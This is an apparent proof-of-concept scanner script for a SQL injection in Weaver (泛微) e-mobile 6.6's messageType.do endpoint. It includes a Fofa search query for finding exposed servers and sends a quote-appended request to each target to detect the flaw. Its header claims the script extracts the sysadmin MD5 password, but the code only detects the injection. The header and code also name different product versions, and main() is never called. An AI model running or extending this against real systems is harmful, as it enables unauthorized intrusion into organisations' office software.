# -*- coding: utf-8 -*-
# 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值
# Fofa:  app="泛微-协同办公OA"

import sys
import requests
import urllib3
import time
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "messageType.do?method=create&typeName=1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    console.print(now_time() + " [INFO]     正在检测泛微e-mobile_6.6 messageType.do-SQlli漏洞", style='bold blue')
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and '推送类型已存在' not in res.text:
            res = requests.get(url=target_url+"'", headers=headers, verify=False, timeout=10)
            if res.status_code == 200 and 'status'  in res.text:
                console.print(now_time() + " [SUCCESS]     存在e-mobile_6.6 messageType.do-SQL注入{}".format(target_url), style='bold green')
            else:
                console.print(now_time() + " [WARNING]  不存在e-mobile_6.6 messageType.do-SQL注入", style='bold red')
        else:
            console.print(now_time() + " [WARNING]  不存在e-mobile_6.6 messageType.do-SQL注入", style='bold red')
    except Exception as e:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


